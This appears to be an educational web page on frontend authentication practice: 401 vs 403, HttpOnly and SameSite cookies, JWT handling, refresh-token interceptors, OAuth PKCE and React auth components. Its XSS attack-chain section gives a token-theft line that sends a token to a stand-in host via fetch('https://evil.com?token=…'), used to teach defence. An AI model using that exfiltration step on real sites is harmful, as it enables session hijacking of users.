What bad auth knowledge looks like in your code

Auth bugs aren't always dramatic hacks — they're often subtle UI logic errors that create false confidence or broken experiences. Here's what gets shipped when you skip this.

⚠ Common frontend auth failures

Token in localStorage XSS script on your page? Token stolen instantly. Any injected JS can read localStorage without restriction.
Hide menu = secure Hiding a button doesn't protect the API route. The backend has to enforce access — you're just hiding UI, not enforcing authorization.
401 vs 403 mix-up Redirecting to login on a 403 creates an infinite loop for authenticated users who simply lack permission. Different errors, different UX.
Parallel refresh calls Five simultaneous 401 responses trigger five refresh calls. Race condition — some succeed, some fail, token state is corrupted.
💡
The rule: Backend owns authorization. Frontend owns the flow, the UX, and correct signal handling. Your job is to show the right state and guide the user — not to be the security layer.
Core concepts
Authentication vs Authorization

Two words that look similar, mean completely different things, and produce completely different HTTP errors when they fail.

🪪
Authentication (AuthN)
Who are you? The system verifies your claimed identity using proof — password, OTP, biometric, magic link, etc. It's about identity verification, not what you can do.
🏢 Analogy: Security checks your ID badge at the office entrance. You scan in — identity confirmed.
🔑
Authorization (AuthZ)
What are you allowed to do? After identity is confirmed, the system decides which resources, pages, or operations you can access, based on your roles and permissions.
🏢 Analogy: You're inside the office. Your keycard opens the dev floor but not the C-suite. Same building, different access.
Click each status to see details ↓
401
Unauthorized
No proof of identity — token missing, expired, or invalid. Authentication failed.
Frontend response: Redirect to login, clear stored token, prompt re-authentication.

Common cause: JWT expired, no Authorization header sent, malformed token.

React: Trigger refresh flow → if refresh fails, redirect to /login.
403
Forbidden
Identity confirmed, but permission denied. You're in the building, wrong room.
Frontend response: Show an "access denied" message. Do NOT redirect to login — the user is already authenticated.

Common cause: User lacks the required role, resource belongs to another user.

React: Render a <Forbidden /> component or inline message — not a login redirect.

⚠️
Mixing up 401 and 403 is one of the most common bugs in frontend auth. A 403 on /api/admin for a non-admin user should never redirect to login — they're already logged in. Show a "not authorized" page instead.

🍪 HttpOnly — Why JavaScript Can't Read It
▼

When the server sets a cookie with the HttpOnly flag, the browser stores it but completely blocks JavaScript access. document.cookie won't return it. No XSS payload can steal it.

This is the primary defense for session IDs and refresh tokens. If your refresh token lives in an HttpOnly cookie, even a fully compromised XSS attack can't read it with JS — though they can still send requests using it (CSRF concern).

HTTP Response Header
Set-Cookie: session_id=abc123; HttpOnly; Secure; SameSite=Strict; Path=/; Max-Age=3600
🛡️ SameSite — Reducing CSRF Risk
▼

CSRF (Cross-Site Request Forgery): a malicious site tricks the user's browser into sending a cookie-authenticated request to your server. The cookie goes along automatically.

The SameSite attribute controls when cookies are sent with cross-origin requests:

ValueBehaviorUse case
StrictNever on cross-site requestsHigh-security, breaks OAuth flows
LaxTop-level navigations onlyModern default, good balance
NoneAlways sent cross-siteMust pair with Secure; CSRF risk
🚪 Logout — What You Must Not Forget
▼

Logout is not just setUser(null). If you only clear React state, the session still exists on the server. A page refresh re-authenticates the user silently via the cookie.

Complete logout flow:

JavaScript
async function logout() { // 1. Tell the server to invalidate the session await api.post('/auth/logout'); // 2. Clear all client state setUser(null); accessToken = null; // 3. Redirect away from authenticated area router.replace('/login'); }
Token-based auth
Bearer Tokens — Access & Refresh

Modern APIs use stateless tokens. The server doesn't store sessions — it trusts a signed token. Your job as frontend: get the token, attach it, refresh it before it dies, handle failures gracefully.

beginner advanced
📖
Simple version: After login, the server gives you a token (a long string). You attach it to every API request in the Authorization header. Like showing your ticket at every door inside a venue — once issued, no desk needed.
⚙️
Advanced: Access tokens are short-lived (minutes–hours), stateless, and signed. Refresh tokens are long-lived (days–weeks), stateful (server can revoke), and should never go in JS-accessible storage. The two-token pattern lets you balance security and UX.
⚡
Access Token
Short-lived (typically 5–60 min). Sent on every API request in the Authorization: Bearer … header. Stateless — the server validates signature without a database lookup.
🔄
Refresh Token
Long-lived (hours–days). Used only to get a new access token when it expires. Should be stored in an HttpOnly cookie or managed via a BFF. Never in localStorage.
JavaScript — Axios Interceptor
// Attach token to every outgoing request api.interceptors.request.use((config) => { if (accessToken) { config.headers.Authorization = `Bearer ${accessToken}`; } return config; }); // Handle 401 — refresh once, then retry let refreshPromise = null; api.interceptors.response.use( (res) => res, async (error) => { if (error.response?.status !== 401) throw error; // Single refresh promise — prevents parallel refresh calls refreshPromise ??= api .post('/auth/refresh') .then((res) => { accessToken = res.data.accessToken; }) .finally(() => { refreshPromise = null; }); await refreshPromise; return api(error.config); // retry original request } );
⚠️
The refreshPromise ??= … pattern is critical. Without it, 5 simultaneous 401 responses spawn 5 refresh calls — creating a race condition where some get new tokens and some fail with an already-used refresh token.

JWTs are widely misunderstood. They are not encrypted — anyone with the token can read the payload. Security comes from the server verifying the signature, not from hiding the data.

🕰️ Handling Expiry (exp) — Frontend Responsibility
▼

The exp claim is a Unix timestamp. You can decode the JWT on the frontend and proactively refresh before it expires — avoiding the 401 → refresh → retry cycle entirely.

JavaScript
function isTokenExpiringSoon(token, bufferSecs = 60) { const [, payload] = token.split('.'); const { exp } = JSON.parse(atob(payload)); const nowSecs = Date.now() / 1000; return exp - nowSecs < bufferSecs; // refresh if < 60s left }
🚫 What NEVER Goes in JWT Payload
▼

Since the payload is Base64-encoded, not encrypted, anyone who intercepts the token can read it. Decode it at jwt.io yourself and see.

❌ Never include
🔴User passwords or password hashes
🔴Credit card / payment data
🔴Full PII (SSN, full address)
🔴API keys or secrets
✅ Safe to include
🟢User ID (sub)
🟢Roles / permissions
🟢Tenant ID
🟢Expiry (exp), issued at (iat)
OAuth 2.0 & OpenID Connect
"Sign in with Google" — How It Actually Works

OAuth 2.0 delegates authorization to a third-party platform. OIDC adds identity on top. For SPAs, the correct flow is Authorization Code + PKCE — the older Implicit flow is deprecated and insecure.

Authorization Code + PKCE Flow — recommended for SPAs
1
Generate PKCE verifier + challenge
SPA creates a random code_verifier, hashes it to code_challenge (SHA-256). This pair proves the exchange later.
crypto.subtle.digest('SHA-256', encoder.encode(verifier))
2
Redirect to Identity Provider (IdP)
Browser is redirected to Google/GitHub/etc. login page with client_id, redirect_uri, code_challenge, and scope.
GET /authorize?response_type=code&code_challenge=…
3
User authenticates at IdP
User enters credentials on the IdP's page — your app never sees the password. IdP issues an authorization code (not a token).
4
Callback with authorization code
IdP redirects back to your redirect_uri with a short-lived ?code=… in the URL. This code is useless without the PKCE verifier.
GET /callback?code=AUTH_CODE&state=…
5
Exchange code for tokens (backend/BFF preferred)
Server POSTs code + code_verifier to IdP's token endpoint. IdP verifies the PKCE pair and returns access + refresh + ID tokens.
POST /token {code, code_verifier, client_secret}
❌
Implicit flow is deprecated. It returned access tokens directly in the URL fragment (#access_token=…), exposing them in browser history, server logs, and referrer headers. Know it for interviews — don't implement it.
💡
The fix: Authorization Code + PKCE achieves the same result for SPAs (no client secret needed) but never exposes tokens in the URL. Always use PKCE for browser-based apps.

OpenID Connect (OIDC) is a thin identity layer built on OAuth 2.0. Where OAuth gives you an access token for resource access, OIDC also gives you an ID token that contains user identity claims.

🎫
Access Token (OAuth)
Used to call protected APIs on behalf of the user. Opaque or JWT. Server validates it. Frontend sends it in Authorization header.
🪪
ID Token (OIDC)
Always a JWT. Contains user identity: sub, email, name, picture. Used by the client to display user info — not sent to APIs.

The Backend For Frontend (BFF) pattern is increasingly the recommended approach for SPAs. Instead of the browser handling tokens directly, a thin server layer manages the OAuth flow and stores tokens in server-side sessions.

✅
With BFF: tokens never touch the browser. SPA communicates with BFF via HttpOnly cookies. BFF attaches the access token to upstream API calls. XSS cannot steal tokens.

React — AuthContext + Provider
const AuthContext = createContext(null); export function AuthProvider({ children }) { const [user, setUser] = useState(null); const [loading, setLoading] = useState(true); // Rehydrate session on mount useEffect(async () => { try { const { data } = await api.get('/auth/me'); setUser(data.user); } catch { setUser(null); // not authenticated } finally { setLoading(false); } }, []); const login = async (credentials) => { const { data } = await api.post('/auth/login', credentials); accessToken = data.accessToken; // in-memory only setUser(data.user); }; const logout = async () => { await api.post('/auth/logout'); accessToken = null; setUser(null); }; return ( <AuthContext.Provider value={{ user, login, logout, loading }}> {loading ? <LoadingScreen /> : children} </AuthContext.Provider> ); }
React — ProtectedRoute with role support
function ProtectedRoute({ children, requiredRole }) { const { user } = useAuth(); // Not authenticated → go to login if (!user) return <Navigate to="/login" replace />; // Authenticated but wrong role → 403 page (NOT login redirect) if (requiredRole && !user.roles.includes(requiredRole)) { return <Forbidden />; // show access denied, not login } return children; } // Usage <Route path="/admin" element={<ProtectedRoute requiredRole="admin"><AdminPanel /></ProtectedRoute>} />
🏗️
State management tip: For small apps, React Context works fine. For complex apps (multiple tabs, background token refresh, optimistic updates), consider Zustand — it avoids unnecessary re-renders and supports middleware for token persistence logic.

⚡ XSS Attack Chain — How Token Theft Happens
▼

Understanding the attack chain helps you defend against it:

1
Injection vector
Attacker injects malicious JS via unsanitized user input, compromised npm package, or third-party script.
2
Token extraction
Script runs localStorage.getItem('token') or reads React state via dev tools hooks.
3
Token exfiltration
Token is sent to attacker's server via fetch('https://evil.com?token=…').
4
Session hijack
Attacker uses the token from their own machine to impersonate the user for the token's remaining lifetime.
🎭 CORS is Not Auth — A Common Misconception
▼

CORS (Cross-Origin Resource Sharing) controls which origins the browser allows to make requests to your API. It is not a security mechanism against attackers — it's a browser feature that protects users from malicious websites making requests on their behalf.

A server-side script, curl, or Postman ignore CORS entirely. CORS only runs in browsers. Your API needs proper authentication regardless of CORS settings.

❌
Don't think: "My API has CORS configured, so it's protected." CORS prevents certain browser behaviors — it doesn't authenticate requests.
Final reference
Frontend Auth — Do's & Don'ts

Pin this. Review it before shipping any auth-related code.

✓ Do these
✅Refresh access token proactively before expiry (check exp)
✅Call server logout endpoint — don't just clear client state
✅Distinguish 401 (unauthenticated) from 403 (unauthorized) in UI
✅Use a single refresh promise to prevent race conditions
✅Store access tokens in memory, refresh in HttpOnly cookie
✅Show role-specific UI from API data, not hardcoded checks
✅Use Authorization Code + PKCE for any OAuth SPA flow
✅Sanitize all user input to prevent XSS injection vectors
✗ Never do these
❌Store tokens in localStorage or sessionStorage
❌Put passwords, full PII, or secrets in JWT payload
❌Redirect to login on 403 — that's a UX bug, not a security feature
❌Think "hiding the button = secured the feature"
❌Log tokens to console, analytics, or error trackers
❌Use the Implicit OAuth flow for new projects
❌Treat CORS as an authentication mechanism
❌Fire multiple refresh calls in parallel — use a shared promise
Quick Reference — Hover for definitions
AuthN
Authentication — proving who you are. Happens before AuthZ. Failure = 401.
 AuthZ
Authorization — what you're allowed to do. Requires successful AuthN first. Failure = 403.
 JWT
JSON Web Token. Three Base64 parts: header.payload.signature. Payload is readable — not encrypted.
 PKCE
Proof Key for Code Exchange. Prevents auth code interception in SPA OAuth flows. Required for public clients.
 BFF
Backend For Frontend. A server-side layer that handles OAuth flows and token storage so the browser never sees raw tokens.
 CSRF
Cross-Site Request Forgery. Attacker tricks browser into sending cookie-authenticated request. Mitigated by SameSite + CSRF tokens.
 XSS
Cross-Site Scripting. Malicious script injected into your page. Can read localStorage, steal tokens. Mitigation: sanitize input, HttpOnly cookies.
 HttpOnly
Cookie attribute that blocks JavaScript access. document.cookie and XSS scripts cannot read it. Only sent via HTTP requests.
 OIDC
OpenID Connect. OAuth 2.0 extension that adds identity. Provides an ID token (JWT) with user profile data on top of the access token.
 Refresh Token
Long-lived token used only to get new access tokens. Should live in HttpOnly cookie. If compromised, attacker has long-term access.
